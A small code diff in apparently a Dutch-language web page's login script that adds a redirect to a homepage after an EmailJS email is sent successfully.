@@ -72,7 +72,7 @@
 
             emailjs.send("service_9q2qoob", "template_jpgwf8d", templateParams)
                 .then(function(response) {
-
+                    window.location.href = "homepage.html";
                 }, function(error) {
                     console.log('Fout bij verzenden e-mail:', error);
                     document.getElementById("message").innerText = "Er is een fout opgetreden bij het inloggen.";
